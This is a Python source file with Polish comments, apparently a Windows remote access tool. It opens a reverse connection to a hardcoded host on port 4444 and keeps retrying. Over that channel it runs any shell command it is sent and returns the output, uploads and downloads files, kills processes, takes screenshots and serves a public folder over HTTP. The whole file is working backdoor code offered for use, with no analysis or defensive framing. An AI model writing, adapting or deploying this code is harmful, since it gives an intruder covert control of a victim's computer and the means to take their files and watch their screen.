import socket
import subprocess
import os
import time
import http.server
import socketserver
import threading

SERVER_HOST = '192.168.1.18' 
SERVER_PORT = 4444

def start_http(port=8080):
    """Uruchamia serwer HTTP w katalogu Public Documents"""
    shared_dir = r"C:\Users\Public\Documents"
    try:
        os.chdir(shared_dir)
    except:
        os.makedirs(shared_dir, exist_ok=True)
        os.chdir(shared_dir)
    
    handler = http.server.SimpleHTTPRequestHandler
    
    def run_http():
        with socketserver.TCPServer(("0.0.0.0", port), handler) as httpd:
            httpd.serve_forever()
    
    threading.Thread(target=run_http, daemon=True).start()
    return "HTTP_STARTED"

def receive_file(conn, filename):
    try:
        with open(filename, 'wb') as f:
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                if data.endswith(b'FILE_TRANSFER_COMPLETE'):
                    f.write(data[:-len(b'FILE_TRANSFER_COMPLETE')])
                    break
                f.write(data)
        return "FILE_RECEIVED"
    except Exception as e:
        return f"ERROR: {e}"

def send_file(conn, filename):
    try:
        if os.path.isfile(filename):
            with open(filename, 'rb') as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    conn.send(chunk)
            time.sleep(0.2)
            conn.send(b'FILE_TRANSFER_COMPLETE')
            return "FILE_SENT"
        else:
            conn.send(b'FILE_NOT_FOUND')
            return "FILE_NOT_FOUND"
    except Exception as e:
        return f"ERROR: {e}"

def kill_process(process_name):
    try:
        subprocess.run(['taskkill', '/F', '/IM', process_name], 
                      capture_output=True, shell=True)
        return f"Process {process_name} terminated.\n"
    except Exception as e:
        return f"Error killing process: {e}\n"

def screenshot():
    """Próbuje zrobić screenshot (wymaga pillow)"""
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        img.save("screenshot.png")
        return "SCREENSHOT_TAKEN"
    except ImportError:
        # Fallback bez pillow
        try:
            import ctypes
            from ctypes import wintypes
            # Kod z użyciem Win32 API...
            return "SCREENSHOT_NOT_SUPPORTED"
        except:
            return "SCREENSHOT_NOT_SUPPORTED"

def main():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(10)
                s.connect((SERVER_HOST, SERVER_PORT))
                print(f"[*] Połączono z {SERVER_HOST}:{SERVER_PORT}")
                
                while True:
                    try:
                        command = s.recv(4096).decode()
                        if not command:
                            break
                        
                        if command.lower() == 'exit':
                            break
                        
                        elif command == 'info':
                            s.send(f"Windows {os.getenv('COMPUTERNAME', 'PC')}".encode())
                        
                        elif command.startswith('download '):
                            filename = command.split(' ', 1)[1]
                            send_file(s, filename)
                        
                        elif command.startswith('upload '):
                            filename = command.split(' ', 1)[1]
                            receive_file(s, filename)
                        
                        elif command.startswith('kill '):
                            process_name = command.split(' ', 1)[1]
                            result = kill_process(process_name)
                            s.send(result.encode())
                        
                        elif command.startswith('http '):
                            port = int(command.split(' ', 1)[1]) if len(command.split(' ', 1)) > 1 else 8080
                            start_http(port)
                            s.send(b"HTTP server started on port " + str(port).encode())
                        
                        elif command == 'screenshot':
                            result = screenshot()
                            s.send(result.encode())
                        
                        else:
                            # Wykonanie dowolnego polecenia
                            try:
                                output = subprocess.run(command, shell=True, 
                                                      capture_output=True, text=True, timeout=30)
                                result = output.stdout + output.stderr
                                if not result:
                                    result = "[+] Command executed (no output)"
                                s.send(result.encode())
                            except subprocess.TimeoutExpired:
                                s.send(b"[!] Command timed out")
                            except Exception as e:
                                s.send(f"Error: {e}".encode())
                    
                    except (ConnectionResetError, BrokenPipeError, TimeoutError):
                        print("[!] Połączenie przerwane. Ponowne łączenie...")
                        break
                    except Exception as e:
                        print(f"[!] Błąd: {e}")
                        break
                        
        except (ConnectionRefusedError, TimeoutError, OSError):
            print(f"[*] Ponowne łączenie za 5 sekund...")
            time.sleep(5)
        except KeyboardInterrupt:
            print("\n[*] Wyłączanie...")
            break

if __name__ == '__main__':
    main()
